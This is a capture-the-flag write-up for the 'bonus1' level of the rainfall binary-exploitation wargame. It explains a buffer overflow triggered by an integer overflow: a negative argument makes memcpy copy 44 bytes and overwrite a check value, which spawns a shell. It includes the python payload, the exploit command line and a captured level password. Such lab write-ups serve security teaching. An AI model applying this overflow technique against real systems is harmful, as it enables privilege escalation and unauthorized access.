## BONUS 1
---
### Starting from now, you will find explanations in the disassembled file for each line in few upcoming levels. This will provide a better understanding of the payload and the solution.
---
After the previous level this level could be one of the easiest level of rainfall.

```c
val = atoi(av[1]);
if (val < 10) {
    memcpy(str, av[2], val * 4);
    if (val == 0x574f4c46) {
        execl("/bin/sh", "sh", 0);
```

Here is the main part to understand in this level. To execute `execl`, we need to set the value of `val` to `0x574f4c46`. However, there is a condition right after the `atoi` function call. It is quite easy to understand that we need to use `memcpy` to change the value of `val`.

```asm
val address:
0x0804843d <+25>:	mov    %eax,0x3c(%esp)
buffer address:
0x08048464 <+64>:	lea    0x14(%esp),%eax
```

As I expected, the value is stored after the buffer. Since `memcpy` doesn't have any limitations except for the values provided as parameters, we can potentially use this function to overwrite the value of `val` and set it to `0x574f4c46`.

So we can right now write the second payload, this content must fill the buffer (who is 40 bytes long) than write the value expected by the program.

```shell
$ python -c "print('\x90' * 40 + '\x46\x4c\x4f\x57')" > /tmp/payload
```

Now we can focus on how `memcpy` can overwrite the value. We need to copy a total of 40 bytes, but the `if` condition restricts `val` to be no greater than 10, and `memcpy` copies `val * 4` bytes.

To overcome this limitation, I will harness the power of integer overflow by employing an **Integer Overflow Attack**. This entails providing a negative value as our first argument, which, when multiplied by 4, will result in a positive value greater than 40. We just to find this value and it's done.

For that I will use the binary conversion of 44.

`44 <==> 00000000 00000000 00000000 00101100`

Perfect! Now we know that multiplying a value by 4 is equivalent to left-shifting the value by 2 bits. Therefore, I will perform a right shift by 2 bits on this number.

`00000000 00000000 00000000 00001011`

Perfect but I want this number to be negative so I will put two `1` at the beginning of the number.

`11000000 00000000 00000000 00001011`

Perfect I just have to convert this number to decimal and I will have the value I need to provide as the first argument.

`11000000 00000000 00000000 00001011 <==> -1073741813`

Now I can execute the executable with the rights arguments and get the flag.

```shell
$ ./bonus1 -1073741813 $(cat /tmp/payload)
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

---

*Source :*

*https://www.binaryconvert.com/result_signed_int.html?hexadecimal=C000000B*

